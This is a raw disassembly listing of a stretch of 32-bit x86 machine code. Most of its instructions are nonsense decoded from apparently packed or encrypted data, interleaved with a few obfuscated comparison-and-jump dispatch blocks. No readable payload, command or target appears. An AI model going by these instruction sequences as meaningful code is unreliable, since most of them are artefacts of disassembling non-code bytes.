  40b5d5:	mov    ebp,0x2c70e567
  40b5da:	and    al,0xf8
  40b5dc:	ins    DWORD PTR es:[edi],dx
  40b5dd:	cmp    eax,0x8adfc13e
  40b5e2:	rcr    BYTE PTR [edx+0x9507b38],0xa8
  40b5e9:	hlt    
  40b5ea:	js     0x40b638
  40b5ec:	daa    
  40b5ed:	daa    
  40b5ee:	fisub  DWORD PTR [ecx]
  40b5f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f1:	xchg   ecx,eax
  40b5f2:	add    esp,ebx
  40b5f4:	pop    edx
  40b5f5:	fild   DWORD PTR [ecx-0x78]
  40b5f8:	out    dx,al
  40b5f9:	ret    
  40b5fa:	test   bl,cl
  40b5fc:	sub    al,ah
  40b5fe:	jns    0x40b5cf
  40b600:	rol    BYTE PTR [ebx+0x2e],0xb4
  40b604:	out    dx,al
  40b605:	sbb    ebx,esp
  40b607:	test   DWORD PTR [ebp+0x10],edx
  40b60a:	pop    es
  40b60b:	iret   
  40b60c:	mov    ds:0x56fd3bd5,al
  40b611:	sbb    dl,bh
  40b613:	xor    esi,edi
  40b615:	aaa    
  40b616:	(bad)  
  40b617:	cmc    
  40b618:	aaa    
  40b619:	sbb    DWORD PTR [ebx+0x915c207],ecx
  40b61f:	pop    eax
  40b620:	add    esp,DWORD PTR [edx]
  40b622:	xchg   ebp,eax
  40b623:	or     dl,BYTE PTR [edx-0x33]
  40b626:	adc    BYTE PTR [eax],ch
  40b628:	inc    ebx
  40b629:	mov    ds:0xa0a16ebe,al
  40b62e:	sahf   
  40b62f:	in     eax,dx
  40b630:	pop    ds
  40b631:	pushf  
  40b632:	push   ecx
  40b633:	mov    BYTE PTR [ecx+0x19c516e],ch
  40b639:	mov    eax,0xb64c2433
  40b63e:	push   es
  40b63f:	add    al,0xc4
  40b641:	popa   
  40b642:	rcr    BYTE PTR [ecx-0x3cfe8741],1
  40b648:	mov    esi,0xa366b77e
  40b64d:	push   es
  40b64e:	sbb    eax,0xc9844742
  40b653:	loopne 0x40b62f
  40b655:	and    al,0x60
  40b657:	(bad)  
  40b658:	mov    WORD PTR ss:[esi-0x43339c76],fs
  40b65f:	adc    BYTE PTR [esp+ecx*1-0x3a],bh
  40b663:	in     eax,0x92
  40b665:	sbb    ch,BYTE PTR [esi-0x19]
  40b668:	dec    edx
  40b669:	fwait
  40b66a:	adc    DWORD PTR [edx+eiz*2+0x3a44dd91],0xffffffc6
  40b672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b673:	push   cs
  40b674:	pop    ds
  40b675:	jae    0x40b5ff
  40b677:	push   ecx
  40b678:	cwde   
  40b679:	(bad)  [ecx+0x47]
  40b67c:	idiv   DWORD PTR [esi]
  40b67e:	mov    edi,0x9fa0cf57
  40b683:	sub    ecx,0x48
  40b686:	mov    esi,0x37b8b164
  40b68b:	ret    0x47a7
  40b68e:	and    dh,ch
  40b690:	je     0x40b6dc
  40b692:	sub    eax,0x9153dffb
  40b697:	cld    
  40b698:	test   DWORD PTR [edx],ebp
  40b69a:	jns    0x40b6bc
  40b69c:	push   ds
  40b69d:	xor    BYTE PTR [ebp+0x6f620c29],al
  40b6a3:	cs dec edi
  40b6a5:	push   es
  40b6a6:	pop    edi
  40b6a7:	xor    ebp,0x33
  40b6aa:	cmp    al,BYTE PTR [eax-0x59]
  40b6ad:	icebp  
  40b6ae:	cdq    
  40b6af:	iret   
  40b6b0:	add    DWORD PTR [edx-0x757cec2c],edi
  40b6b6:	push   ecx
  40b6b7:	(bad)  [ebp-0x45]
  40b6ba:	ja     0x40b6f6
  40b6bc:	mov    ?,ecx
  40b6be:	jns    0x40b699
  40b6c0:	stc    
  40b6c1:	pop    ebp
  40b6c2:	btc    DWORD PTR [edx+edx*8-0x59],edx
  40b6c7:	test   BYTE PTR [edx+0xa],al
  40b6ca:	dec    ebx
  40b6cb:	or     DWORD PTR [edi-0x45],ebx
  40b6ce:	fcom   DWORD PTR [eax+0x4c67ef30]
  40b6d4:	mov    cl,0x43
  40b6d6:	adc    al,0xa5
  40b6d8:	loopne 0x40b74d
  40b6da:	jne    0x40b713
  40b6dc:	ror    BYTE PTR [ecx+edx*4-0x2cdb9007],cl
  40b6e3:	les    ebx,FWORD PTR [edi]
  40b6e5:	out    0x22,eax
  40b6e7:	pop    esp
  40b6e8:	sbb    al,0x5e
  40b6ea:	in     eax,0xd2
  40b6ec:	in     eax,dx
  40b6ed:	mov    ecx,0xbdcce68b
  40b6f2:	xor    cl,dl
  40b6f4:	rol    al,cl
  40b6f6:	frstor [ebx-0xc701d83]
  40b6fc:	jg     0x40b722
  40b6fe:	stos   DWORD PTR es:[edi],eax
  40b6ff:	push   0xce0e58b9
  40b704:	iret   
  40b705:	jae    0x40b778
  40b707:	xor    eax,0x4e1ceea
  40b70c:	(bad)  
  40b70e:	pop    ecx
  40b70f:	mov    esi,DWORD PTR ds:0x66f2583f
  40b715:	sbb    DWORD PTR [eax],edx
  40b717:	mov    esi,0x81ae8bc2
  40b71c:	popf   
  40b71d:	cld    
  40b71e:	xchg   ecx,eax
  40b71f:	cmc    
  40b720:	push   esi
  40b721:	mov    edi,DWORD PTR [esi]
  40b723:	pusha  
  40b724:	rcr    BYTE PTR [edx+esi*8+0x1a489378],cl
  40b72b:	xor    ah,dh
  40b72d:	sbb    ecx,DWORD PTR [edx+0x2e2549a9]
  40b733:	adc    cl,BYTE PTR [ecx+0x121c558e]
  40b739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b73a:	sub    ah,dl
  40b73c:	mov    ecx,ss
  40b73e:	jg     0x40b7bc
  40b740:	test   eax,0x82b00b2c
  40b745:	pusha  
  40b746:	in     eax,dx
  40b747:	mov    WORD PTR [ebp-0x360e7840],gs
  40b74d:	pusha  
  40b74e:	xor    BYTE PTR [edx],0x64
  40b751:	daa    
  40b752:	inc    edi
  40b753:	in     al,0x3c
  40b755:	adc    bl,BYTE PTR [eax]
  40b757:	out    0x32,al
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	in     eax,0x90
  40b78c:	gs das 
  40b78e:	mov    dl,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	test   al,bl
  40b798:	add    BYTE PTR [eax],dh
  40b79a:	arpl   WORD PTR [eax+0x3e],bx
  40b79d:	add    esi,DWORD PTR [ebp-0x35]
  40b7a0:	fild   WORD PTR [edi]
  40b7a2:	xchg   ebp,eax
  40b7a3:	in     eax,0x8e
  40b7a5:	push   0xffffffaf
  40b7a7:	sub    eax,0x5a3aa65
  40b7ac:	popf   
  40b7ad:	(bad)  
  40b7ae:	mov    ebx,0x9a950b20
  40b7b3:	je     0x40b807
  40b7b5:	popa   
  40b7b6:	push   0x6b
  40b7b8:	popa   
  40b7b9:	mov    ds:0xdbf49501,eax
  40b7be:	mov    al,ds:0x31bf4e9e
  40b7c3:	mov    ah,0x4d
  40b7c5:	lods   eax,DWORD PTR ds:[esi]
  40b7c6:	cmp    DWORD PTR [ebp-0x6397ce75],ebp
  40b7cc:	jecxz  0x40b7ec
  40b7ce:	test   DWORD PTR [ebx+edi*4+0x60],0x174df7b7
  40b7d6:	lock in eax,0x70
  40b7d9:	dec    ecx
  40b7da:	mov    bl,0x1f
  40b7dc:	sbb    eax,0x9b9668c8
  40b7e1:	(bad)  
  40b7e2:	xchg   edx,eax
  40b7e3:	outs   dx,DWORD PTR ds:[esi]
  40b7e4:	sub    al,BYTE PTR [ecx]
  40b7e6:	cmp    esp,eax
  40b7e8:	(bad)  
  40b7e9:	cdq    
  40b7ea:	int    0x12
  40b7ec:	lea    esi,[eax]
  40b7ee:	xor    dl,dh
  40b7f0:	pop    eax
  40b7f1:	test   esp,0x7cb2cd19
  40b7f7:	push   edx
  40b7f8:	enter  0x1c3,0xde
  40b7fc:	fnstcw WORD PTR [ebx+esi*2+0x50]
  40b800:	mov    DWORD PTR [edi+eax*8+0x7ccd70c6],edi
  40b807:	push   edi
  40b808:	lock scas al,BYTE PTR es:[edi]
  40b80a:	mov    dh,0xa3
  40b80c:	and    dl,0xf4
  40b80f:	cmp    ah,BYTE PTR cs:[ebp-0x232b5f89]
  40b816:	jno    0x40b7fc
  40b818:	out    0xbc,eax
  40b81a:	les    ecx,FWORD PTR [ecx-0x27]
  40b81d:	dec    ebx
  40b81e:	cli    
  40b81f:	hlt    
  40b820:	gs mov edx,ds
  40b823:	mov    edx,0x9b7ea4e6
  40b828:	or     BYTE PTR [ecx-0x22],bh
  40b82b:	jmp    0x6a04:0x40fd2039
  40b832:	dec    esi
  40b833:	js     0x40b7e0
  40b835:	lock jmp 0xa86f:0xac6fb69f
  40b83d:	pop    es
  40b83e:	jge    0x40b889
  40b840:	adc    esp,ebp
  40b842:	cmc    
  40b843:	arpl   WORD PTR gs:[ecx+0x49],bx
  40b847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b848:	adc    eax,0x4612e5c2
  40b84d:	jge    0x40b835
  40b84f:	cmp    eax,0x4fa9c281
  40b854:	cld    
  40b855:	push   esp
  40b856:	mov    edx,0x771a75df
  40b85b:	sub    eax,0x393df4dc
  40b860:	adc    BYTE PTR [ebp-0x6b],dh
  40b863:	cmp    ah,BYTE PTR [eax+ecx*1-0x2f]
  40b867:	cmp    eax,DWORD PTR [edx]
  40b869:	cmp    cl,cl
  40b86b:	cli    
  40b86c:	adc    ch,BYTE PTR [ebx+0x2c]
  40b86f:	aas    
  40b870:	sbb    BYTE PTR [esi+0x4da0d108],bl
  40b876:	fs mov al,0xa3
  40b879:	xchg   DWORD PTR [ebp-0x100495b2],ebx
  40b87f:	in     al,0x9f
  40b881:	jle    0x40b8bf
  40b883:	cmc    
  40b884:	and    BYTE PTR [esi+0x5d736bc3],ah
  40b88a:	xor    ebp,DWORD PTR [edx-0x6101e2f6]
  40b890:	xchg   edx,eax
  40b891:	cmp    al,0x13
  40b893:	or     BYTE PTR ds:0xcfceee37,0x25
  40b89a:	add    BYTE PTR [ebx+0x56],bh
  40b89d:	adc    eax,0x5e949360
  40b8a2:	rcl    WORD PTR [edi],1
  40b8a5:	call   0xf0ab:0x9688a496
  40b8ac:	mov    ebx,0xc8854d16
  40b8b1:	rcr    BYTE PTR [ecx],1
  40b8b3:	add    eax,DWORD PTR [ecx]
  40b8b5:	mov    edi,0xba903323
  40b8ba:	sub    al,0xc0
  40b8bc:	dec    edi
  40b8bd:	les    eax,FWORD PTR [edx]
  40b8bf:	lock shl DWORD PTR [edi],1
  40b8c2:	loope  0x40b85f
  40b8c4:	arpl   WORD PTR [esi+0x4b],di
  40b8c7:	mov    eax,ds:0xe45d753f
  40b8cc:	(bad)  
  40b8cd:	not    BYTE PTR [edx-0x724261fc]
  40b8d3:	push   ss
  40b8d4:	stos   BYTE PTR es:[edi],al
  40b8d5:	imul   edx,DWORD PTR [ecx],0x42c0069a
  40b8db:	xchg   edi,eax
  40b8dc:	push   0x830862e6
  40b8e1:	jbe    0x40b932
  40b8e3:	(bad)  
  40b8e4:	lods   eax,DWORD PTR ds:[esi]
  40b8e5:	sub    esp,edx
  40b8e7:	(bad)  
  40b8e8:	dec    eax
  40b8e9:	xchg   BYTE PTR [ebx-0x30b0ebf9],dh
  40b8ef:	and    al,0xd
  40b8f1:	or     BYTE PTR [edx],bl
  40b8f3:	mov    bl,0xec
  40b8f5:	or     al,0x23
  40b8f7:	fld    DWORD PTR [ebx-0x59]
  40b8fa:	ins    DWORD PTR es:[edi],dx
  40b8fb:	xor    eax,0x52a23d0
  40b900:	stos   BYTE PTR es:[edi],al
  40b901:	push   ds
  40b902:	mov    ebx,0xcad5555c
  40b907:	sar    DWORD PTR [ebp+ebp*1-0x47c1e405],0x29
  40b90f:	jecxz  0x40b987
  40b911:	jns    0x40b969
  40b913:	test   eax,0xe66e24b2
  40b918:	add    DWORD PTR [esi+ebx*4-0x6a116bb8],ecx
  40b91f:	(bad)  
  40b920:	mov    bh,0xab
  40b922:	xchg   ebx,ebp
  40b924:	xchg   esi,eax
  40b925:	(bad)  
  40b927:	stos   BYTE PTR es:[edi],al
  40b928:	mov    edi,0x176d0c26
  40b92d:	cli    
  40b92e:	(bad)  
  40b92f:	ficomp DWORD PTR [eax+edx*8+0x1ad34bfc]
  40b936:	pop    ebx
  40b937:	push   ebp
  40b938:	mov    esi,0x2b565adb
  40b93d:	inc    edx
  40b93e:	stos   BYTE PTR es:[edi],al
  40b93f:	sbb    esi,esp
  40b941:	mov    dh,0x79
  40b943:	inc    esp
  40b944:	out    dx,eax
  40b945:	mov    ch,0x85
  40b947:	adc    esp,esi
  40b949:	shl    DWORD PTR [ecx-0x80a15e6],cl
  40b94f:	ja     0x40b93a
  40b951:	xchg   esi,eax
  40b952:	test   ebp,ebx
  40b954:	mov    WORD PTR [edi],ds
  40b956:	adc    eax,0x64cc37da
  40b95b:	mov    ch,0x51
  40b95d:	(bad)  
  40b95f:	scas   al,BYTE PTR es:[edi]
  40b960:	xchg   BYTE PTR ds:0x1d40f2c6,dh
  40b966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b967:	cmp    eax,0x866026fd
  40b96c:	ret    0x6ce2
  40b96f:	add    BYTE PTR [edi+0x4b],bh
  40b972:	xchg   esp,eax
  40b973:	fstp   DWORD PTR [eax+0x9]
  40b976:	fst    QWORD PTR [ebx+0x10]
  40b979:	pop    edx
  40b97a:	xor    edi,ebp
  40b97c:	mov    ebp,0xcfa2c77d
  40b981:	or     DWORD PTR [edi+0x14fdd152],ecx
  40b987:	call   0x45898489
  40b98c:	pop    edi
  40b98d:	js     0x40b957
  40b98f:	pop    ds
  40b990:	retf   
  40b991:	icebp  
  40b992:	adc    al,0xef
  40b994:	sub    dh,BYTE PTR [edx+0x3d63ea2f]
  40b99a:	loopne 0x40b9d9
  40b99c:	es adc al,0xd
  40b99f:	pop    es
  40b9a0:	stos   DWORD PTR es:[edi],eax
  40b9a1:	or     BYTE PTR [ebx+0x5b],dh
  40b9a4:	ins    BYTE PTR es:[edi],dx
  40b9a5:	adc    al,0x1f
  40b9a7:	and    dh,BYTE PTR [edx-0x11bd27d5]
  40b9ad:	xor    al,0x75
  40b9af:	push   0xdc9cfe80
  40b9b4:	cmc    
  40b9b5:	jo     0x40b98e
  40b9b7:	mov    eax,0x1acbd358
  40b9bc:	sahf   
  40b9bd:	inc    eax
  40b9be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9bf:	lods   al,BYTE PTR ds:[esi]
  40b9c0:	mov    cl,0xa7
  40b9c2:	into   
  40b9c3:	and    DWORD PTR [eax-0x7edbe524],ecx
  40b9c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ca:	push   ss
  40b9cb:	push   es
  40b9cc:	imul   ebp,DWORD PTR [eax],0x6df7eaef
  40b9d2:	shl    DWORD PTR [edx],0xbd
  40b9d5:	jb     0x40ba15
  40b9d7:	push   0x16
  40b9d9:	adc    dl,BYTE PTR [ebx-0x1fba7493]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x47c9a808],eax
  40ba0f:	ret    
  40ba10:	inc    esp
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	sbb    edi,DWORD PTR [edx+0x20b11676]
  40ba1f:	loopne 0x40b9a5
  40ba21:	scas   eax,DWORD PTR es:[edi]
  40ba22:	adc    dl,ah
  40ba24:	mov    ebx,0x119ceb25
  40ba29:	es and al,0x35
  40ba2c:	pop    edi
  40ba2d:	or     dl,BYTE PTR [ecx]
  40ba2f:	std    
  40ba30:	popa   
  40ba31:	in     eax,dx
  40ba32:	jle    0x40ba8e
  40ba34:	jecxz  0x40ba20
  40ba36:	jp     0x40baa9
  40ba38:	addr16 jb 0x40baa1
  40ba3b:	jmp    0x40ba02
  40ba3d:	sub    al,0xd0
  40ba3f:	add    dh,BYTE PTR [ebp+0x79c74f2]
  40ba45:	repnz mov bl,BYTE PTR [eax]
  40ba48:	mov    ebp,0xadc4d6b4
  40ba4d:	jmp    0x3eca:0x94805b1b
  40ba54:	xchg   ebp,eax
  40ba55:	aad    0xec
  40ba57:	ror    dl,1
  40ba59:	xor    BYTE PTR [ebx+0x30],cl
  40ba5c:	imul   edx,ebp,0xffffff90
  40ba5f:	fld    QWORD PTR [ebx+ebx*2+0x17]
  40ba63:	xchg   ch,ch
  40ba65:	jbe    0x40baa0
  40ba67:	add    BYTE PTR [eax+0x6b],al
  40ba6a:	jno    0x40ba91
  40ba6c:	pop    ecx
  40ba6d:	cdq    
  40ba6e:	call   0x95ab:0xf3142037
  40ba75:	jns    0x40ba58
  40ba77:	mov    ebx,0xdad9c7f1
  40ba7c:	nop
  40ba7d:	test   eax,0x56619f0
  40ba82:	add    dl,BYTE PTR [ebx+0x5559b4e3]
  40ba88:	shl    edi,cl
  40ba8a:	inc    esp
  40ba8b:	sahf   
  40ba8c:	or     edi,DWORD PTR [esi+0x79c916c9]
  40ba92:	inc    edi
  40ba93:	inc    esp
  40ba94:	dec    esi
  40ba95:	(bad)  
  40ba96:	loope  0x40ba96
  40ba98:	in     al,dx
  40ba99:	call   0xf466da6a
  40ba9e:	stc    
  40ba9f:	lds    edi,FWORD PTR [ecx+0x68]
  40baa2:	mov    DWORD PTR [edi-0x3a],esi
  40baa5:	push   ss
  40baa6:	mov    ch,0x3c
  40baa8:	push   cs
  40baa9:	mov    al,ds:0x14cbfc9f
  40baae:	lods   eax,DWORD PTR ds:[esi]
  40baaf:	inc    esp
  40bab0:	push   edi
  40bab1:	test   eax,0x7a8f9250
  40bab6:	in     eax,dx
  40bab7:	dec    ecx
  40bab8:	add    al,cl
  40baba:	sbb    BYTE PTR [edx+0x61],ah
  40babd:	mov    bh,0xa9
  40babf:	repnz push ss
  40bac1:	xchg   edi,eax
  40bac2:	or     BYTE PTR [ebx],0xaf
  40bac5:	enter  0xe3c2,0x38
  40bac9:	icebp  
  40baca:	(bad)  
  40bacb:	in     al,0x36
  40bacd:	sahf   
  40bace:	jae    0x40ba91
  40bad0:	imul   ecx,DWORD PTR [ebx+0x79],0x83e3ea2d
  40bad7:	(bad)  
  40bad8:	push   esp
  40bad9:	imul   ebx
  40badb:	call   0xcc6d:0x66abef80
  40bae2:	les    edi,FWORD PTR [esi-0x28de159d]
  40bae8:	sub    esi,esp
  40baea:	outs   dx,BYTE PTR ds:[esi]
  40baeb:	pop    esp
  40baec:	push   es
  40baed:	push   esp
  40baee:	pusha  
  40baef:	ja     0x40bae8
  40baf1:	aam    0xc7
  40baf3:	call   0x9281:0xf0922606
  40bafa:	add    dl,ah
  40bafc:	adc    eax,DWORD PTR [edx-0x69]
  40baff:	and    DWORD PTR [ecx+0x7c9991d2],0x90ef2a57
  40bb09:	clc    
  40bb0a:	inc    edi
  40bb0b:	pop    ebx
  40bb0c:	cmp    BYTE PTR [esi],al
  40bb0e:	aas    
  40bb0f:	sub    eax,0x27a9317e
  40bb14:	(bad)  
  40bb15:	pushf  
  40bb16:	xchg   ecx,eax
  40bb17:	sub    ebx,edx
  40bb19:	rcr    ecx,1
  40bb1b:	imul   edx,DWORD PTR [edi],0xffffffcf
  40bb1e:	cwde   
  40bb1f:	fwait
  40bb20:	pop    ebp
  40bb21:	add    DWORD PTR [eax],edi
  40bb23:	pop    ebp
  40bb24:	add    DWORD PTR [esi-0x6768b379],eax
  40bb2a:	jbe    0x40bab7
  40bb2c:	jg     0x40bad8
  40bb2e:	cmp    DWORD PTR [ebx+0x2884a5d5],ebp
  40bb34:	enter  0x22b1,0x8
  40bb38:	sub    dl,BYTE PTR gs:[esi+0x3ef28a3a]
  40bb3f:	and    ah,BYTE PTR [edx-0x11]
  40bb42:	dec    ebx
  40bb43:	cmp    DWORD PTR [esi],edx
  40bb45:	jnp    0x40bb05
  40bb47:	sahf   
  40bb48:	push   ebp
  40bb49:	arpl   WORD PTR [edi],sp
  40bb4b:	jns    0x374e04d3
  40bb51:	or     esp,edx
  40bb53:	mov    al,0x31
  40bb55:	pop    edx
  40bb56:	push   edi
  40bb57:	sbb    BYTE PTR [ebx],0xd
  40bb5a:	pop    edi
  40bb5b:	sbb    BYTE PTR [edi-0x3c],al
  40bb5e:	stos   BYTE PTR es:[edi],al
  40bb5f:	inc    esi
  40bb60:	cmp    DWORD PTR [esi],0xffffffc0
  40bb63:	sbb    DWORD PTR [esi-0x1e],ebx
  40bb66:	xor    eax,eax
  40bb68:	add    al,0x6a
  40bb6a:	pop    esp
  40bb6b:	fwait
  40bb6c:	std    
  40bb6d:	shl    BYTE PTR [ecx-0x3efa8942],cl
  40bb73:	mov    ch,0xa7
  40bb75:	sbb    DWORD PTR [esi+0x50c55579],eax
  40bb7b:	int3   
  40bb7c:	pop    ecx
  40bb7d:	mov    ah,0xb9
  40bb7f:	daa    
  40bb80:	pop    ds
  40bb81:	jg     0x40bbc4
  40bb83:	jl     0x40bb55
  40bb85:	popa   
  40bb86:	push   ebp
  40bb87:	rcr    dl,cl
  40bb89:	mov    WORD PTR [esi-0x78],ss
  40bb8c:	idiv   BYTE PTR [ebp+0x1dd01930]
  40bb92:	inc    DWORD PTR [edx]
  40bb94:	mov    WORD PTR [esp+eiz*2-0x6d875312],gs
  40bb9b:	jns    0x40bb1f
  40bb9d:	arpl   bp,bp
  40bb9f:	int    0x98
  40bba1:	push   cs
  40bba2:	lods   eax,DWORD PTR ds:[esi]
  40bba3:	pop    ecx
  40bba4:	xor    eax,0xa630f1a4
  40bba9:	mov    ebx,0x8902731b
  40bbae:	fild   WORD PTR [edx-0x10ae7f38]
  40bbb4:	add    al,0x33
  40bbb6:	ds sub ah,ch
  40bbb9:	js     0x40bbfe
  40bbbb:	and    DWORD PTR [ebp-0x58c7cdd],0x75
  40bbc2:	push   ss
  40bbc3:	pusha  
  40bbc4:	loopne 0x40bba1
  40bbc6:	push   eax
  40bbc7:	cmp    BYTE PTR [esi+ecx*8-0x3d9570],0x39
  40bbcf:	aas    
  40bbd0:	aas    
  40bbd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbd2:	mov    bh,0x36
  40bbd4:	and    edx,edx
  40bbd6:	ret    
  40bbd7:	mov    cl,0xd
  40bbd9:	mov    eax,ds:0x987ab5b9
  40bbde:	push   es
  40bbdf:	pop    esp
  40bbe0:	fld    DWORD PTR [ecx+edx*1+0x6a1981e1]
  40bbe7:	outs   dx,BYTE PTR ds:[esi]
  40bbe8:	sbb    BYTE PTR [edi-0x752f8687],cl
  40bbee:	jmp    0x40bc08
  40bbf0:	gs or  eax,0xb7d20900
  40bbf6:	mov    ebx,0x588b0c5d
  40bbfb:	mov    WORD PTR [eax+0x6d79f6f1],?
  40bc01:	sbb    BYTE PTR [edi+0x13e6c394],0x39
  40bc08:	in     eax,dx
  40bc09:	xor    al,BYTE PTR [edi]
  40bc0b:	pop    ebp
  40bc0c:	(bad)  [edx+0x24]
  40bc0f:	setl   BYTE PTR [ecx-0x2267899a]
  40bc16:	mov    eax,0x468dd598
  40bc1b:	(bad)  
  40bc1c:	pop    edi
  40bc1d:	sbb    DWORD PTR ds:0x17666abf,edx
  40bc23:	lea    edi,[edi-0x5b78700c]
  40bc29:	lods   al,BYTE PTR ds:[esi]
  40bc2a:	(bad)  
  40bc2b:	lahf   
  40bc2c:	and    eax,0xfbab3484
  40bc31:	rcr    bl,cl
  40bc33:	in     eax,0xe2
  40bc35:	jmp    0x7ac3:0x61738811
  40bc3c:	cmp    eax,0x3a4fe7b1
  40bc41:	mov    ecx,0xd79e1e19
  40bc46:	lahf   
  40bc47:	inc    ebx
  40bc48:	mov    al,ds:0x2ca329de
  40bc4d:	sub    eax,0x7d0cd4d5
  40bc52:	push   es
  40bc53:	shl    ebp,0xbc
  40bc56:	adc    ebp,DWORD PTR [edi-0x5cc40c67]
  40bc5c:	in     al,0xb
  40bc5e:	inc    ecx
  40bc5f:	movzx  eax,WORD PTR [eax+edi*2]
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	cmp    al,0xd0
  40bc97:	add    edx,DWORD PTR [ecx-0x3a]
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	aad    0x1d
  40bca3:	mov    BYTE PTR [ebx],cl
  40bca5:	inc    esi
  40bca6:	aas    
  40bca7:	call   0xdab7:0xe339dd99
  40bcae:	jnp    0x40bcbb
  40bcb0:	xor    eax,0x7057c83c
  40bcb5:	push   ds
  40bcb6:	mov    al,ds:0x2cd74690
  40bcbb:	push   0x414b51a3
  40bcc0:	xor    ch,al
  40bcc2:	cdq    
  40bcc3:	mov    dh,0xec
  40bcc5:	daa    
  40bcc6:	mov    ebp,0xe0762da2
  40bccb:	push   ebx
  40bccc:	sub    DWORD PTR [ecx],eax
  40bcce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bccf:	(bad)  
  40bcd2:	(bad)  
  40bcd3:	jge    0x40bd25
  40bcd5:	sti    
  40bcd6:	or     esi,DWORD PTR [esp+esi*4]
  40bcd9:	pop    ebx
  40bcda:	mov    dl,0x75
  40bcdc:	adc    esp,esi
  40bcde:	mov    bh,BYTE PTR [eax]
  40bce0:	xor    eax,eax
  40bce2:	xchg   ebx,ecx
  40bce4:	lahf   
  40bce5:	pop    ebp
  40bce6:	fnstenv [eax-0x241ebf0b]
  40bcec:	push   ebx
  40bced:	nop
  40bcee:	push   es
  40bcef:	xor    ecx,DWORD PTR [ecx+0x46]
  40bcf2:	aas    
  40bcf3:	or     cl,cl
  40bcf5:	xlat   BYTE PTR ds:[ebx]
  40bcf6:	sbb    al,0x97
  40bcf8:	lods   al,BYTE PTR ds:[esi]
  40bcf9:	cmp    cl,ah
  40bcfb:	stc    
  40bcfc:	test   cl,bh
  40bcfe:	sbb    esi,edi
  40bd00:	(bad)  
  40bd01:	popa   
  40bd02:	or     al,0x55
  40bd04:	out    dx,eax
  40bd05:	adc    BYTE PTR [ecx+eax*8],0xc3
  40bd09:	ins    DWORD PTR es:[edi],dx
  40bd0a:	mov    ah,0x93
  40bd0c:	(bad)  
  40bd0d:	not    BYTE PTR [eax+0x655791b4]
  40bd13:	aas    
  40bd14:	mov    al,0xd1
  40bd16:	jecxz  0x40bd43
  40bd18:	lock adc bl,BYTE PTR [eax]
  40bd1b:	and    eax,0x2962cf21
  40bd20:	jecxz  0x40bd7d
  40bd22:	sub    al,BYTE PTR [eax]
  40bd24:	or     al,0xe2
  40bd26:	popa   
  40bd27:	sub    ebp,ebp
  40bd29:	jp     0x40bd89
  40bd2b:	pushf  
  40bd2c:	scas   al,BYTE PTR es:[edi]
  40bd2d:	test   BYTE PTR ds:0x7a0fb331,al
  40bd33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd34:	sub    ecx,DWORD PTR [ebx-0x42]
  40bd37:	aas    
  40bd38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd39:	dec    esi
  40bd3a:	adc    BYTE PTR [eax+0x52e58dd5],bh
  40bd40:	cdq    
  40bd41:	fs sbb ebx,ecx
  40bd44:	fwait
  40bd45:	xor    esi,0xbec2a578
  40bd4b:	outs   dx,DWORD PTR ds:[esi]
  40bd4c:	mov    dl,0x67
  40bd4e:	rcr    BYTE PTR [ecx-0x29],1
  40bd51:	ror    dh,0xf4
  40bd54:	xchg   esp,eax
  40bd55:	push   edi
  40bd56:	push   0x2c
  40bd58:	sbb    BYTE PTR [ebx-0x4d62ba69],ah
  40bd5e:	xor    eax,DWORD PTR [edx]
  40bd60:	gs stos BYTE PTR es:[edi],al
  40bd62:	sub    DWORD PTR [ebx+0x8014522],eax
  40bd68:	xchg   edi,eax
  40bd69:	shr    BYTE PTR [esi],1
  40bd6b:	in     al,0x82
